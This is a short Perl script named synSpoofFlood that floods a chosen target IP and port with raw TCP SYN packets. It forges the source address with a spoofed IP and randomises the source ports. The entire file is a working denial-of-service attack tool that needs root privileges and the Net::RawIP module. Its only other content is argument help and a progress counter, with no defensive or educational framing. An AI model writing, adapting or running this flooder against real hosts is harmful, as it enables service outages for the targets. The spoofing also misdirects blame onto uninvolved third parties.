#!/usr/bin/perl
# synSpoofFlood
# Author: forwardprefekt
#
# Based on Simple SYN Flooder by iphelix, Lucas Allen (www.lucasallan.com)
# Requires perl, Net::RawIP module, and root privileges
#

$|=0; 
use Net::RawIP;
use Getopt::Std;

my $helper = 'Required args:
        -c count of packets to send
        -t real target ip4 address (1.2.3.4)
        -s spoofed source ip4 address (1.2.3.4)
        -p target port
';


my %options=();

getopts('c:t:s:p:', \%options) or die($helper);

$counter = $options{"c"};
$dst = $options{'t'};
$src = $options{'s'};
$port = $options{'p'};

sub attack(){
   $a = new Net::RawIP;
   while($counter > 0) {
      $src_port = rand(65534)+1;
      $a->set({ip => {saddr => $src,daddr => $dst},tcp => {source => $src_port,dest => $port, syn => 1}});
      $a->send;
	$counter--;
	if($counter % 100 ==0) {
		printf("%d packets left...\n",$counter);
	}
   }
}

attack();
